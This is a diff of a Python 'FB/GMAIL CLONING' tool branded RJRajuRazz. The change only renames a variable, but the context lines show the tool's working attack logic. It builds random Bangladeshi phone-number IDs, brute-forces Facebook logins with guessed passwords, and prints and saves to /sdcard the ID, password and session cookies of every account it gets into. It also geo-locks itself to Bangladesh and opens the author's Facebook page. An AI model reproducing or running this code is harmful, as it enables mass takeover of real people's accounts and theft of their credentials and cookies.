@@ -147,9 +147,9 @@ try:
     IP = requests.get("http://ip-api.com/json/").json()["query"]
     Picchi = requests.get("http://ip-api.com/json/").json()["country"]
     if "Bangladesh" not in Picchi:
-            print(f"\n\x1b[38;5;44mSorry Bro  RJ Raju Razz Tools will only work in Bangladesh\033[1;97m")
-            RJ Raju Razz = input('\n\x1b[38;5;196mYour Any mbasicblem Help (y/n) : ')
-            if RJ Raju Razz == 'y':
+            print(f"\n\x1b[38;5;44mSorry Bro  RJRajuRazz Tools will only work in Bangladesh\033[1;97m")
+            RJRajuRazz = input('\n\x1b[38;5;196mYour Any mbasicblem Help (y/n) : ')
+            if RJRajuRazz == 'y':
                os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828')
             exit()
 except requests.exceptions.ConnectionError:
@@ -158,7 +158,7 @@ except requests.exceptions.ConnectionError:
 
 def clear():
     os.system('clear')
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
 os.system('clear')
 #print("\x1b[1;97m Hello bro first Follow me On Facebook ")
 os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828')
@@ -172,7 +172,7 @@ else:
     a = ltx
     tag = "AM"
 
-RJ Raju Razz ="""
+RJRajuRazz ="""
 
    
   __  __           _____ _______ ______ _____  
@@ -186,9 +186,9 @@ RJ Raju Razz ="""
 
                                                                                                     
 \033[1;97m─────────────────────────────────────────────────────
-\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m AUTHOR  \033[1;91m : \033[1;92mRJ Raju Razz
-\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m FACEBOOK\033[1;91m : \033[1;92mRJ Raju Razz
-\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m GITHUB  \033[1;91m : \033[1;92mRJ Raju Razz
+\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m AUTHOR  \033[1;91m : \033[1;92mRJRajuRazz
+\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m FACEBOOK\033[1;91m : \033[1;92mRJRajuRazz
+\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m GITHUB  \033[1;91m : \033[1;92mRJRajuRazz
 \033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOOLS   \033[1;91m : \033[1;92mFB/GMAIL CLONING
 \033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m VERSION \033[1;91m : \033[1;90m4.1
 \033[1;97m─────────────────────────────────────────────────────"""
@@ -217,7 +217,7 @@ def main():
         sys.stdout.flush()
     os.getuid
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print('\033[1;97m[\033[1;92m1\033[1;97m]\033[1;92m START FB CLONING ')
     print('\033[1;97m[\033[1;92m2\033[1;97m]\033[1;92m START GMAIL CLONING')
     print('\033[1;97m[\033[1;92m3\033[1;97m]\033[1;92m FOLLOW GITHUB ACCOUNT')
@@ -240,7 +240,7 @@ def main():
 #--------------------Method--------------------•
 def Uid():
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print('\x1b[1;92mTRY ALL METHOD WORKING \x1b[1;97m')
     print('\033[1;97m─────────────────────────────────────────────────────')
     print('\033[1;97m[\033[1;92m1\033[1;97m]\033[1;92m METHOD 1 \033[1;36m>\033[1;33m>\x1b[1;91m SLOW\x1b[1;97m')
@@ -258,11 +258,11 @@ def Uid():
 #--------------------BD--------------------•
 def xxx():
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print("\033[1;32m016 017 013 018 019 014 015\n\033[1;97m─────────────────────────────────────────────────────")
     code = input('\033[1;97mCHOOSE SIM CODE \033[1;91m:\033[1;92m ')
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     limit = int(input('\033[1;97mEXAMPLE \033[1;91m: \033[1;92m2000, 5000, 10000, 50000\n\033[1;97m─────────────────────────────────────────────────────\n\033[1;97mCHOOSE CLONING LIMIT \033[1;91m:\033[1;92m '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
@@ -282,16 +282,16 @@ def xxx():
     print('\033[1;97m─────────────────────────────────────────────────────')
     print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL OK IDS \033[1;90m: \033[1;92m'+str(len(ok))+'\n\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL CP IDS \033[1;90m: \033[1;91m'+str(len(cp)))
     print('\033[1;97m─────────────────────────────────────────────────────')
-    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJ Raju Razz-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJ Raju Razz😭-CP.txt')
+    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJRajuRazz-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJRajuRazz😭-CP.txt')
     input(f'\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;90m mbasicCESS HAS BEEN COMPLETE\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;92m PRESS ENTER TO BACK MENU ');os.system("clear");main()
 #--------------------BD--------------------•
 def xd():
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print("\033[1;32m016 017 013 018 019 014 015\n\033[1;97m─────────────────────────────────────────────────────")
     code = input('\033[1;97mCHOOSE SIM CODE \033[1;91m:\033[1;92m ')
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     limit = int(input('\033[1;97mEXAMPLE \033[1;91m: \033[1;92m2000, 5000, 10000, 50000\n\033[1;97m─────────────────────────────────────────────────────\n\033[1;97mCHOOSE CLONING LIMIT \033[1;91m:\033[1;92m '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
@@ -311,17 +311,17 @@ def xd():
     print('\033[1;97m─────────────────────────────────────────────────────')
     print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL OK IDS \033[1;90m: \033[1;92m'+str(len(ok))+'\n\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL CP IDS \033[1;90m: \033[1;91m'+str(len(cp)))
     print('\033[1;97m─────────────────────────────────────────────────────')
-    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJ Raju Razz😎-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJ Raju Razz😭-CP.txt')
+    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJRajuRazz😎-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJRajuRazz😭-CP.txt')
     input(f'\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;90m mbasicCESS HAS BEEN COMPLETE\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;92m PRESS ENTER TO BACK MENU ');os.system("clear");main()
 
 #--------------------BD--------------------•
 def bd():
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print("\033[1;32m016 017 013 018 019 014 015\n\033[1;97m─────────────────────────────────────────────────────")
     code = input('\033[1;97mCHOOSE SIM CODE \033[1;91m:\033[1;92m ')
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     limit = int(input('\033[1;97mEXAMPLE \033[1;91m: \033[1;92m2000, 5000, 10000, 50000\n\033[1;97m─────────────────────────────────────────────────────\n\033[1;97mCHOOSE CLONING LIMIT \033[1;91m:\033[1;92m '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
@@ -341,13 +341,13 @@ def bd():
     print('\033[1;97m─────────────────────────────────────────────────────')
     print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL OK IDS \033[1;90m: \033[1;92m'+str(len(ok))+'\n\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m TOTAL CP IDS \033[1;90m: \033[1;91m'+str(len(cp)))
     print('\033[1;97m─────────────────────────────────────────────────────')
-    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJ Raju Razz-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJ Raju Razz-CP.txt')
+    print('\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m OK IDS SAVE \033[1;90m: \033[1;92m/sdcard/RJRajuRazz-OK.txt\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;97m CP IDS SAVE \033[1;90m: \033[1;91m/sdcard/RJRajuRazz-CP.txt')
     input(f'\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;90m mbasicCESS HAS BEEN COMPLETE\n\033[1;97m\033[1;97m[\033[1;92m✔︎\033[1;97m]\033[1;92m PRESS ENTER TO BACK MENU ');os.system("clear");main()
 
 #--------------------Gmail--------------------•
 def gmail():
     os.system("clear")
-    print(RJ Raju Razz)
+    print(RJRajuRazz)
     print('\x1b[1;92mTRY ALL METHOD WORKING \x1b[1;97m')
     print('\033[1;97m─────────────────────────────────────────────────────')
     print('\033[1;97m[\033[1;92m1\033[1;97m]\033[1;92m METHOD 1 \033[1;36m>\033[1;33m>\x1b[1;91m SLOW\x1b[1;97m')
@@ -616,9 +616,9 @@ def sex(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 cid = "1000"+coki1[0:11]
-                print('\33[1;92m[RJ Raju Razz-OK] '+cid+' | '+ps+' ')
+                print('\33[1;92m[RJRajuRazz-OK] '+cid+' | '+ps+' ')
                 print('\r\033[1;97mCOOKIES\033[1;91m :\033[1;92m '+coki)
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 ok.append(cid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -679,8 +679,8 @@ def sexy(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print(f'\33[1;92m[RJ Raju Razz-OK] '+uid+' | '+ps+' \n\033[1;37mCOOKIES : \033[1;32m'+coki+   '  ')
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                print(f'\33[1;92m[RJRajuRazz-OK] '+uid+' | '+ps+' \n\033[1;37mCOOKIES : \033[1;32m'+coki+   '  ')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -692,7 +692,7 @@ def sexy(uid,pwx,tl):
                 continue
         loop+=1
         dc = random.choice([Z,S,H,L,M,V,P,O,X,A,B,C,D,F,N,LR,LG,LY,LB,LM])
-        sys.stdout.write(f'\r\r%s[RJ Raju Razz] \033[1;30m[%s/%s]\033[1;32m OK/CP %s/%s \r'%(dc,loop,tl,len(ok),len(cp))),
+        sys.stdout.write(f'\r\r%s[RJRajuRazz] \033[1;30m[%s/%s]\033[1;32m OK/CP %s/%s \r'%(dc,loop,tl,len(ok),len(cp))),
         sys.stdout.flush()
     except:
         pass
@@ -747,9 +747,9 @@ def hot(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 cid = "1000"+coki1[0:11]
-                print('\x1b[1;92m[RJ Raju Razz-OK] '+cid+' | '+ps+' ')
+                print('\x1b[1;92m[RJRajuRazz-OK] '+cid+' | '+ps+' ')
                 print('\r\x1b[1;97mCOOKIES :\033[1;92m '+coki)
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 ok.append(cid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
